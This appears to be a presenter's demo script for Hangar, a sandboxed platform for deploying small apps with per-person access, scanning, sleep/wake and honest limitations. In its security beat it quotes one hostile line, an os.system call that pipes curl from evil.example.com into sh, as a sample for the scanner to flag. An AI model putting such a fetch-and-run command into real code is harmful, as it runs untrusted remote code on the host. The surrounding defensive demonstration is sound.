# Demo script

A running Hangar with a real gVisor sandbox, on this laptop. Everything below
is live right now — no slides.

## Before you hit record

```powershell
# is it up?
curl.exe -s http://hangar.localtest.me/healthz
```

Expect `"sandbox_runtime":"runsc"`, `"auth":"enabled"`, `"idle_reaper":true`
and `"metrics":true`. If it doesn't answer, or if URLs show a "Caddy works!"
page, see [If something is down](#if-something-is-down).

Open a **fresh browser profile or a private window** — the sharing part is much
better told from a signed-out state.

Apps sleep after **5 minutes** with no traffic on this stack, so an app you
haven't touched in a while takes about three seconds on the first click. That
is the feature, not a stall — beat 6 is where you point at it. If you'd rather
it never happened mid-take, raise `HANGAR_IDLE_TIMEOUT` in
`/opt/hangar-demo/.env` and `docker compose up -d hangar`.

| | |
|---|---|
| Dashboard | <http://hangar.localtest.me> |
| Admin | `you@demo.local` / `demo-password-2026` |
| Teammate | `teammate@demo.local` / `demo-password-2026` |

`*.localtest.me` is a public DNS name that resolves to `127.0.0.1`, so these
look like real URLs with no hosts-file editing.

---

## The story, in six beats

### 1. The problem (20 seconds, no screen)

"Claude Code writes me a useful little tool in ten minutes. Getting it to where
three colleagues can actually use it — with the right people having access —
still takes a day. That's the gap."

### 2. Deploy something (60 seconds)

Dashboard → **Deploy an app** → *Upload a zip* → pick any small Python or Node
app. Or, from a terminal:

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -c "cd /opt/hangar-demo && ./.venv/bin/hangar deploy examples/fastapi-hello --url http://127.0.0.1:8080 --token $TOKEN"
```

Watch it go `queued → building → running` and hand back a URL. Nobody wrote a
Dockerfile. Nothing was configured.

Worth saying out loud: **it worked out what the app was on its own** — the
detected runtime and framework are on the app's page.

### 3. It's actually sandboxed (30 seconds)

This is the part most demos skip.

```powershell
wsl -d Ubuntu-24.04 -u root -- docker exec hangar-<app-id> uname -sr
# Linux 4.19.0-gvisor
wsl -d Ubuntu-24.04 -u root -- uname -sr
# Linux 6.6.87.2-microsoft-standard-WSL2
```

"That's a different kernel. The app isn't talking to my machine's kernel at
all — it's talking to gVisor's, in user space. If it tries something hostile,
it's arguing with a sandbox."

And:

```powershell
wsl -d Ubuntu-24.04 -u root -- docker inspect hangar-<app-id> --format '{{json .NetworkSettings.Ports}}'
# {"8000/tcp":null}   -> no published ports at all
```

"It has no route to the internet and no port on my machine. The only way in is
through the platform."

### 4. Share it like a document (90 seconds — the important one)

Open the app's **People** tab. Add `teammate@demo.local` as a **viewer**.

Now, in a private window, go to <http://whoami.localtest.me>.

- Signed out → **refused**. The app is never reached.
- Sign in as the teammate → the app loads, and says:

```json
{
  "user": "teammate@demo.local",
  "role": "viewer",
  "authenticated_by": "the platform, not this app"
}
```

**Then show them the source** — `examples/whoami/main.py` is about 25 lines and
contains no login code, no session handling, no user table. It just reads a
header.

"The app has no idea how to authenticate anyone. It doesn't need to. Access is
the platform's job, so every tool gets it for free."

Then try <http://notes.localtest.me> as the same teammate → **403**. It was
never shared with them.

### 5. It's not a toy (30 seconds)

App page → **Security** tab. Every deploy is scanned *before* it's built —
because building installs dependencies, and that runs their code.

Deploy something with `os.system("curl evil.example.com | sh")` in it and show
it flagged, with the file and line.

Then the **Usage** tab: CPU and memory against the app's own caps, sampled
every 15 seconds. "It can't take the box down, and I can see it not doing so."

Also worth 10 seconds: the **notes** app writes to a database. Restart it from
the dashboard; the data is still there.

Worth 15 seconds if anyone asks about configuration: the **Secrets** tab. Set
one, and note that it never comes back — the API has no endpoint that returns a
value. "You give a tool its API key without putting it in the repo, and without
the platform being able to hand it to anyone either."

### 6. It gets out of its own way (45 seconds)

App page → **Sleep**. The status chip says `sleeping`. Prove it really stopped:

```powershell
wsl -d Ubuntu-24.04 -u root -- docker inspect hangar-<app-id> --format '{{.State.Status}}'
# exited
```

Now open the app's URL. It comes back in about three seconds and the link never
changed. Measured on this stack: **2.81s median**, through sign-in checking,
the proxy, a gVisor container starting and FastAPI importing.

"Ten tools a team barely uses don't need to hold memory all day. They come back
when someone opens them. That's how a free VM hosts more than three apps."

If someone asks whether that's a security hole — it isn't, and it's worth
showing. Sleep it again, then open the URL in a **signed-out** window: 401, and
the container stays `exited`. Waking happens after the access check, so a
stranger walking hostnames can't start anything.

---

## Questions people will ask

**"Is this just Heroku?"** — Heroku assumes you trust the code and everyone who
can reach it. This assumes you trust neither: sandboxed by default, no network,
and access controlled per person.

**"What if the app is malicious?"** — It's scanned before it runs, it runs
under gVisor with its own kernel, it has no outbound network, and it has hard
CPU and memory caps. Show the Security tab.

**"Where does it run?"** — Right now, this laptop. It's designed for a free
Oracle ARM VM; the code is identical, and that's a configuration change.

**"How many of these can it host?"** — More than the memory suggests, because
apps that aren't being used aren't running. That's beat 6.

**"Doesn't it need a login for each app?"** — No, and that's the interesting
part. Show `examples/whoami/main.py`: 25 lines, no auth code. The platform
authenticates and passes identity in a header.

**"What's not done?"** — Answer honestly, it lands better. It has never been
through a security review by anyone other than the person who wrote it, and it
has had zero real users. Logs are per-container and on demand rather than
shipped anywhere, so there's no searching across apps. Everything you've seen
runs on one laptop; the Oracle VM it's designed for hasn't been provisioned,
and none of the timings have been re-measured on ARM.

---

## If something is down

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose ps"
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose up -d"
```

`DOCKER_HOST` is already set for root's shells to the demo's own Docker socket
(`/var/run/docker-hangar.sock`) — separate from Docker Desktop's, so the two
don't fight over `/var/run/docker.sock`. If a `docker` command shows the wrong
containers, that variable is why.

After a reboot, WSL starts at logon (a shortcut in the Startup folder) and the
containers come back on their own. Give it about a minute.

**If every URL shows a "Caddy works!" page**, Caddy restarted and dropped its
routing table — its image reloads a packaged Caddyfile on every start, which
throws away everything Hangar pushed through the admin API. Hangar rebuilds the
table when the control plane starts, so the fix is to restart it:

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -c "cd /opt/hangar-demo && docker compose restart hangar"
```

That republishes every app's route *and* the dashboard's own. Worth knowing
before you record: this is what a stale-looking demo actually is.

## Tearing it down

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose down -v"
wsl --unregister Ubuntu-24.04          # removes the distro entirely
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\HangarDemo-StartWSL.vbs"
powercfg /change standby-timeout-ac 30 # restore sleep
```
